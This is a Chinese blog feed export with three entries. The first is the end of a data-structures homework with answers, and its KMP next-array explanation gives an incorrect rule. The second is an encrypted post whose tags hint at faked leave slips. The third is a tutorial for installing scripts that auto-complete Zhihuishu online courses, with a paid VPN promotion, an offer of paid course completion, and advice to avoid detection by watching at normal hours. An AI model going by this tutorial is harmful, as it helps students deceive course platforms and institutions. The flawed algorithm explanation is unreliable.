<p>在单链表中，虽然可以通过知道该元素所在结点的地址来访问该元素，但这种访问方式并不属于随机存取，因为单链表不支持通过下标或索引直接访问元素。单链表只能通过从头结点开始逐个遍历查找的方式来找到指定位置的元素，这导致了访问的时间复杂度是 O(n)。因此，单链表并不属于随机存取结构。</p>
</blockquote>
<p>38.每种数据结构都具备三个基本操作：插入、删除和查找。</p>
<p>正确</p>
<p><font color='red'>错误</font></p>
<blockquote>
<p>这个说法是不准确的。尽管许多数据结构确实具有插入、删除和查找等基本操作，但并不是每种数据结构都具备这三种基本操作。不同类型的数据结构可能有不同的设计目标和特定的操作。有些数据结构可能只支持其中一些操作，而另一些数据结构可能具有不同的基本操作。因此，不能将每种数据结构都简单地归纳为具有这三个基本操作。</p>
</blockquote>
<p>39.线性结构的基本特征是：每个元素有且仅有一个直接前驱和一个直接后继。</p>
<p>正确</p>
<p><font color='red'>错误</font></p>
<blockquote>
<p>线性结构的基本特征是每个元素最多只有一个直接前驱和一个直接后继，而不是有且仅有一个。这意味着某些元素可以没有直接前驱或直接后继（比如第一个元素和最后一个元素）。因此，说法是错误的。</p>
</blockquote>
<p>40.算法的时间复杂度都要通过算法中的基本语句的执行次数来确定。</p>
<p><font color='red'>正确</font></p>
<p>错误</p>
<blockquote>
<p>这个说法是正确的。算法的时间复杂度是通过对算法中的基本语句执行次数的分析来确定的。基本语句通常是指算法中执行最频繁的操作，例如赋值语句、比较语句、算术运算等。通过计算基本语句执行的次数，可以得出算法的时间复杂度，从而评估算法的执行效率。</p>
</blockquote>
<h1 id="三、简答题"><a href="#三、简答题" class="headerlink" title="三、简答题"></a>三、简答题</h1><ol>
<li><h2 id="试解释数据结构、数据类型、抽象数据类型的概念"><a href="#试解释数据结构、数据类型、抽象数据类型的概念" class="headerlink" title="试解释数据结构、数据类型、抽象数据类型的概念"></a>试解释数据结构、数据类型、抽象数据类型的概念</h2></li>
</ol>
<ul>
<li><strong>数据结构</strong>：数据结构是计算机科学中一种特殊的方式，它可以使我们在计算机中更有效地存储和组织数据。例如，我们可以使用数组、链表、栈、队列、图和树等数据结构来存储和管理数据。</li>
<li><strong>数据类型</strong>：数据类型是编程语言中的一个概念，它定义了一组数据的值的集合和这组数据上可进行的操作。例如，整数类型（int）定义了整数的集合，我们可以对这些整数进行加法、减法、乘法和除法等操作。</li>
<li><strong>抽象数据类型（ADT）</strong>：抽象数据类型是一种逻辑描述，它定义了一组数据和在这组数据上可进行的操作，但并未指定这些操作的具体实现。例如，栈ADT定义了一组元素和两个基本操作：push（将元素添加到栈顶）和 pop（从栈顶移除元素）。然而，栈ADT并未指定这些操作应如何实现。我们可以使用数组或链表来实现栈ADT。</li>
</ul>
<ol start="2">
<li><h2 id="以下为单链表在指定位置插入元素的-C-代码，请将划线处代码补充完整。"><a href="#以下为单链表在指定位置插入元素的-C-代码，请将划线处代码补充完整。" class="headerlink" title="以下为单链表在指定位置插入元素的 C++代码，请将划线处代码补充完整。"></a>以下为单链表在指定位置插入元素的 C++代码，请将划线处代码补充完整。</h2><p>以下是将划线处代码补充完整的 C++ 代码：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;DataType&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i, DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt; *p = first, *s = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span> &amp;&amp; count &lt; i - <span class="number">1</span>) <span class="comment">// (1) 划线处</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;插入位置错误&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="keyword">new</span> <span class="built_in">Node</span>&lt;DataType&gt;(x);</span><br><span class="line">        s-&gt;next = p-&gt;next; <span class="comment">// (2) 划线处</span></span><br><span class="line">        p-&gt;next = s; <span class="comment">// (3) 划线处</span></span><br><span class="line">        <span class="keyword">if</span> (p == last) <span class="comment">// (4) 划线处</span></span><br><span class="line">            last = s;</span><br><span class="line">        length++; <span class="comment">// (5) 划线处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在这段代码中：</p>
<ol>
<li>划线处 (1) 是 while 循环的条件，用于寻找指定位置的插入点。</li>
<li>划线处 (2) 将新节点 s 的 next 指针指向 p 后面的节点。</li>
<li>划线处 (3) 将 p 的 next 指针指向新节点 s。</li>
<li>划线处 (4) 检查是否是在链表末尾插入，如果是，则更新 last 指针。</li>
<li>划线处 (5) 增加链表的长度。</li>
</ol>
</li>
<li><h2 id="如下为循环队列的实现代码，给出了类定义、构造函数、入队和出队函数，请-补充完整划线处代码。"><a href="#如下为循环队列的实现代码，给出了类定义、构造函数、入队和出队函数，请-补充完整划线处代码。" class="headerlink" title="如下为循环队列的实现代码，给出了类定义、构造函数、入队和出队函数，请 补充完整划线处代码。"></a>如下为循环队列的实现代码，给出了类定义、构造函数、入队和出队函数，请 补充完整划线处代码。</h2><p>以下是补充完整划线处代码的实现：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> QueueSize = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CirQueue</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CirQueue</span>();</span><br><span class="line">    ~<span class="built_in">CirQueue</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(DataType x)</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">DeQueue</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">GetHead</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Empty</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DataType data[QueueSize];</span><br><span class="line">    <span class="type">int</span> front, rear;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">CirQueue&lt;DataType&gt;::<span class="built_in">CirQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">    front = rear = <span class="number">0</span>; <span class="comment">// (1) 划线处</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> CirQueue&lt;DataType&gt;::<span class="built_in">EnQueue</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((rear + <span class="number">1</span>) % QueueSize == front) <span class="comment">// (2) 划线处</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;队满，上溢出&quot;</span>;</span><br><span class="line">    rear = (rear + <span class="number">1</span>) % QueueSize; <span class="comment">// (3) 划线处</span></span><br><span class="line">    data[rear] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType CirQueue&lt;DataType&gt;::<span class="built_in">DeQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (front == rear) <span class="comment">// (4) 划线处</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;下溢&quot;</span>;</span><br><span class="line">    front = (front + <span class="number">1</span>) % QueueSize; <span class="comment">// (5) 划线处</span></span><br><span class="line">    <span class="keyword">return</span> data[front];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在代码中：</p>
<ol>
<li>划线处 (1) 完成了循环队列的构造函数，将 front 和 rear 初始化为 0。</li>
<li>划线处 (2) 是判断队列是否已满的条件。</li>
<li>划线处 (3) 更新 rear 的位置，使其指向下一个入队元素应该存放的位置。</li>
<li>划线处 (4) 是判断队列是否为空的条件。</li>
<li>划线处 (5) 更新 front 的位置，使其指向下一个出队元素的位置。</li>
</ol>
</li>
<li><h2 id="如下代码为顺序表和单链表的-C-类定义，请补充划线处缺失的代码，并对-含义进行注释。"><a href="#如下代码为顺序表和单链表的-C-类定义，请补充划线处缺失的代码，并对-含义进行注释。" class="headerlink" title="如下代码为顺序表和单链表的 C++类定义，请补充划线处缺失的代码，并对 含义进行注释。"></a>如下代码为顺序表和单链表的 C++类定义，请补充划线处缺失的代码，并对 含义进行注释。</h2><p>&lt;1&gt; 顺序表：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MaxSize = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">SeqList</span>();</span><br><span class="line">    <span class="built_in">SeqList</span>(DataType a[], <span class="type">int</span> n);</span><br><span class="line">    ~<span class="built_in">SeqList</span>();</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Length</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Empty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(DataType x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i, DataType x)</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DataType data[MaxSize]; <span class="comment">// (1) 顺序表的数据存储数组</span></span><br><span class="line">    <span class="type">int</span> length; <span class="comment">// (2) 顺序表的当前长度</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>&lt;2&gt; 单链表：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    DataType data; <span class="comment">// (3) 节点中存储的数据</span></span><br><span class="line">    Node&lt;DataType&gt; *next; <span class="comment">// (4) 指向下一个节点的指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkList</span>();</span><br><span class="line">    <span class="built_in">LinkList</span>(DataType a[], <span class="type">int</span> n);</span><br><span class="line">    ~<span class="built_in">LinkList</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Length</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(DataType x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i, DataType x)</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;DataType&gt; *first; <span class="comment">// (5) 单链表的头指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在代码中：</p>
<ol>
<li>划线处 (1) 是顺序表的数据存储数组。</li>
<li>划线处 (2) 是顺序表的当前长度。</li>
<li>划线处 (3) 是单链表节点中存储的数据。</li>
<li>划线处 (4) 是指向下一个节点的指针。</li>
<li>划线处 (5) 是单链表的头指针。</li>
</ol>
</li>
<li><h2 id="以下为顺序栈的定义、初始化和压栈操作的实现，请补充完整划线部分代码。"><a href="#以下为顺序栈的定义、初始化和压栈操作的实现，请补充完整划线部分代码。" class="headerlink" title="以下为顺序栈的定义、初始化和压栈操作的实现，请补充完整划线部分代码。"></a>以下为顺序栈的定义、初始化和压栈操作的实现，请补充完整划线部分代码。</h2><p>以下是补充完整划线部分代码的实现：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> StackSize = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqStack</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">SeqStack</span>();</span><br><span class="line">    ~<span class="built_in">SeqStack</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(DataType x)</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">GetTop</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DataType data[StackSize]; <span class="comment">// (1) 划线处</span></span><br><span class="line">    <span class="type">int</span> top; <span class="comment">// (2) 划线处</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">SeqStack&lt;DataType&gt;::<span class="built_in">SeqStack</span>()</span><br><span class="line">&#123;</span><br><span class="line">    top = <span class="number">-1</span>; <span class="comment">// (3) 划线处</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> SeqStack&lt;DataType&gt;::<span class="built_in">Push</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == StackSize - <span class="number">1</span>) <span class="comment">// (4) 划线处</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;栈满&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;上溢&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    top++; <span class="comment">// (5) 划线处</span></span><br><span class="line">    data[top] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在代码中：</p>
<ol>
<li>划线处 (1) 定义了顺序栈的数据存储数组。</li>
<li>划线处 (2) 定义了顺序栈的栈顶指针。</li>
<li>划线处 (3) 是顺序栈的构造函数，初始化栈顶指针 top 为 -1。</li>
<li>划线处 (4) 是判断栈是否已满的条件。</li>
<li>划线处 (5) 是实现元素压栈操作，将栈顶指针 top 向上移动一个位置，并将元素 x 压入栈顶。</li>
</ol>
</li>
<li><h2 id="设目标主串为-S-“BBCABCDABABCDABD”，模式串为-T-“ABCDABD”"><a href="#设目标主串为-S-“BBCABCDABABCDABD”，模式串为-T-“ABCDABD”" class="headerlink" title="设目标主串为 S&#x3D;“BBCABCDABABCDABD”，模式串为 T&#x3D;“ABCDABD”"></a>设目标主串为 S&#x3D;“BBCABCDABABCDABD”，模式串为 T&#x3D;“ABCDABD”</h2><ol>
<li><p>简述按 BF 算法对主串 S 进行模式匹配的过程; </p>
<blockquote>
<p> BF（Brute-Force）算法是一种简单直接的字符串匹配算法。其匹配过程为： 从主串 S 的第一个字符开始，依次和模式串 T 进行匹配。如果当前字符匹配成功，则继续比较下一个字符，直到模式串 T 完全匹配或者匹配失败。如果匹配失败，则将模式串向右移动一位，再次和主串进行匹配。这个过程会一直持续到找到匹配的子串或者主串遍历完毕。</p>
</blockquote>
</li>
<li><p>手工计算模式串 T 的 next 值; </p>
<blockquote>
<p>手工计算模式串 T 的 next 数组的过程如下：</p>
<p>T &#x3D; “ABCDABD” </p>
<p>首先，next[0] &#x3D; -1，next[1] &#x3D; 0（规定 next 数组下标从 0 开始）。</p>
<p>依次计算 next 数组的值： </p>
<p>对于第 i 个字符，如果 T[next[i]] &#x3D;&#x3D; T[i-1]，则 next[i+1] &#x3D; next[i] + 1； </p>
<p>否则，将 next[i+1] 更新为 0。</p>
</blockquote>
</li>
<li><p>简述利用求得的 next 数组，按 KMP 算法对主串 S 进行模式匹配的过程。</p>
<blockquote>
<p> KMP 算法利用模式串 T 的 next 数组在匹配过程中避免不必要的回溯。匹配过程如下： 从主串 S 的第一个字符开始，同时从模式串 T 的第一个字符开始进行匹配。 如果当前字符匹配成功，则继续比较下一个字符。 如果匹配失败，根据 next 数组进行回溯操作，将模式串 T 向右移动相应的位数，使得模式串能够对齐主串中的下一个字符，继续匹配。 如果模式串完全匹配成功，则返回匹配的起始位置；否则，主串遍历完毕仍未找到匹配子串，则匹配失败。</p>
</blockquote>
</li>
</ol>
<h1 id="四、附加题"><a href="#四、附加题" class="headerlink" title="四、附加题"></a>四、附加题</h1><p>请认真思考，谈一下你对数据结构课程的建议。（限 100 字以上，共 10 分）</p>
<blockquote>
<p>这题没什么好说的</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>考试</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>这里什么也没有</title>
    <url>/posts/2d7b16cc.html</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，去问问作者吧。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="6c77ee84489a175b90b87b7bc68a250e8ba02a83ca60575f064f59e99c74b83d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">文章敏感特殊，特此加密，有需要请联系作者。</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>假条</tag>
        <tag>智慧曲园</tag>
        <tag>截图</tag>
        <tag>醒图</tag>
        <tag>P图</tag>
      </tags>
  </entry>
  <entry>
    <title>智慧树/知到/刷课脚本安装教程</title>
    <url>/posts/3af6ecf8.html</url>
    <content><![CDATA[<blockquote>
<p>新的刷课脚本已更新，强烈建议用新的，并把本脚本结合使用，效果最佳，传送门：<a href="https://blog.w1ndys.top/posts/1ff200e1">https://blog.w1ndys.top/posts/1ff200e1</a></p>
</blockquote>
<blockquote>
<p>前言：使用本工具请自觉遵守国家法律法规，下载后请 24 小时之内删除，本教程来自 <a class="link"   href="http://www.w1ndys.top/" >www.w1ndys.top<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><u> 使用 </u> 本教程即代表用户同意本教程 <a href="#%E7%94%A8%E6%88%B7%E5%8D%8F%E8%AE%AE">用户协议</a>，使用本教程造成的 <font color='red'> 一切后果由个人承担 </font>，<u> 作者 </u> <font color='red'> 概不负责 </font></p>
<p><font color='red'> 请注意：本教程所涉及脚本工具开发者并不是博主本人，内涵涉及收费的内容，请酌情考虑 </font></p>
<p>本教程编写于 2023 年 11 月 3 日，距离时间过长可能脚本已失效，请铭记</p>
<p>本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任</p>
</blockquote>
<p>本教程编写耗时 <font color='red'> 180 分钟 </font> 且浏览完全免费，且看且珍惜</p>
<p>前期步骤基本和超星学习通的教程差不多</p>
<h1 id="作者建议"><a href="#作者建议" class="headerlink" title="作者建议"></a>作者建议</h1><p>建议在阳间的时间刷课，后台可以看到浏览时间的</p>
<h1 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h1><ol>
<li><p>一台能上网的电脑</p>
</li>
<li><p>Google Chrome（推荐）</p>
<p>没有 Google 的可以用 Windows 自带的 Edge 浏览器（</p>
</li>
<li><p>脚本猫（用篡改猴也行，本教程以脚本猫为例</p>
<p>详情：<a class="link"   href="https://docs.scriptcat.org/docs/use/#/" >脚本猫使用文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>一个魔法工具（梯子）</p>
<p><font color="#3333FF"> 需要特别注意的是，使用本工具有一定的流量计费，3.8-38.8 不等，根据自己需要选择 </font>，此费用也不是我本人收取，而是流量的提供方收取，特别注意这点 <font color="#FF0000" size=5> 如果你介意此费用，你可以关闭此页面退出阅读了。</font> <span style="color:#FFFF00; font-size:1.2em;"> 如果你自己有梯子可以忽略这一步 </span> 具体注意事项下面会提到</p>
</li>
<li><p>OCS 客户端</p>
</li>
<li><p>一个懂的百度的大脑（不是</p>
</li>
<li><p>一双灵敏的眼睛（不是</p>
</li>
<li><p>一个耐心看教程的好习惯（不是</p>
</li>
<li><p>一颗真诚的心和 <font color='red'> 良好的态度 </font>，有问题 <a class="link"   href="https://qm.qq.com/q/9n506oZ8Ri&personal_qrcode_source=4" >联系博主<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>（实在懒得弄可以找我低价代刷</p>
</li>
</ol>
<h1 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h1><p>有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………</p>
<h2 id="爬墙工具的介绍和安装使用"><a href="#爬墙工具的介绍和安装使用" class="headerlink" title="爬墙工具的介绍和安装使用"></a>爬墙工具的介绍和安装使用</h2><p><span style="color:#FF0000; font-size:1.1em;">如果你自己有梯子可以忽略这一步</span></p>
<p><span style="color:#FF0000; font-size:1.1em;">如果你自己有梯子可以忽略这一步</span></p>
<p><span style="color:#FF0000; font-size:1.1em;">如果你自己有梯子可以忽略这一步</span></p>
<p><span style="color:#FF0000; font-size:1.1em;">如果你自己有梯子可以忽略这一步</span></p>
<h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p><font color="#FF3333"> 这些你都不需要记，看看就行 </font></p>
<p>​		虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。</p>
<p>　　如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。</p>
<p>　　通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。</p>
<h3 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h3><p>微信搜索公众号关注：  <code>W1ndys_Official</code>  点击下方菜单 GPT 可获取注册地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/wx.png"
                      alt="注册"
                ></p>
<p>输入邮箱密码注册账号，注册完成后登陆</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7.png"
                      alt="注册"
                ></p>
<p>然后点击左侧购买订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%AE%A2%E9%98%85.png"
                      alt="订阅"
                ></p>
<p>根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%B4%AD%E4%B9%B0%E8%AE%A2%E9%98%85.png"
                      alt="购买订阅"
                ></p>
<p>我本人用的是 <font color="#FF0000"> 38.8 巨量不限时，推荐这个 </font>，大约可以用 2 年左右，平均下来大约 0.6&#x2F;天</p>
<blockquote>
<p>因为我不只有这一个需求，另外还有使用 <font color="#FF0000"> ChatGPT，bingai </font> 等的需求，所以这个是最划算的。</p>
</blockquote>
<p>另外关于如何使用 ChatGPT 的教程以后有时间我会写，OpenAI 官方的 ChatGPT</p>
<p>买完之后点击左上方仪表盘可以看到你的已订阅</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E4%BB%AA%E8%A1%A8%E7%9B%98.png"
                      alt="仪表盘"
                ></p>
<p>然后点击仪表盘下方的使用文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%A2%E6%88%B7%E7%AB%AF.png"
                      alt="客户端安装"
                ></p>
<p>选择你的系统安装客户端</p>
<p>安装完之后登陆客户端就可以看到这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90.png"
                      alt="安装完成"
                ></p>
<h3 id="连接节点"><a href="#连接节点" class="headerlink" title="连接节点"></a>连接节点</h3><p>目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局，<font color="#FF0000"> 如果后续出现连接失败就换个节点 </font></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/VPN/%E8%8A%82%E7%82%B9.png"
                      alt="节点"
                ></p>
<h2 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h2><p>首先安装脚本猫，点击进入 <a class="link"   href="https://docs.scriptcat.org/docs/use/#/" >脚本猫使用文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/1.jpg"
                      alt="安装脚本猫"
                ></p>
<p>根据自己浏览器选择安装，这里以 Google Chrome 为例</p>
<p>（如果长时间进不去则需要 <font color='red'> 科学上网 </font>，由于种种原因这里不过多赘述）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/2.jpg"
                      alt="安装脚本猫"
                ></p>
<p>进来之后点击图示右上角安装（由于我已经安装过了所以图示是 remove）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/xxt-ScriptCat/3.jpg"
                      alt="启用脚本猫"
                ></p>
<p>然后进入浏览器扩展中心可以看到已经安装好了，启用该扩展</p>
<p>然后 <a class="link"   href="https://docs.ocsjs.com/docs/app#%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%97%E8%A1%A8" >进入 OCS 使用文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载 OCS 客户端</p>
<p>（进去可能会让你下载视频，那个是操作教程，可看可不看，我会在后面写教程）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/1.jpg"
                      alt="下载 OCS 客户端"
                ></p>
<p>下载之后安装，直接双击 exe 文件就行，没啥别的要动的</p>
<p>下载完之后在桌面应该可以看到图标，双击图标打开</p>
<ol>
<li>进入软件后，一键初始化软件，选择浏览器，脚本管理器和脚本，点击安装。</li>
<li>新建浏览器， 点击右侧蓝色按钮启动</li>
<li>等待“OCS 导航页”页面加载完成后（可能会卡死，可重启或者直接刷新页面）进入任意网课平台即可，等待期间请勿操作浏览器。</li>
</ol>
<p>（更具体的教程和使用须知可以看软件内部自带的教程）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/2.jpg"
                      alt="新建浏览器"
                ></p>
<p>点击新建浏览器，然后点击创建之后浏览器之后的小三角</p>
<p>之后等待操作自动完成，可以看到可以刷题的网站	</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/3.jpg"
                      alt="初始化完成"
                ></p>
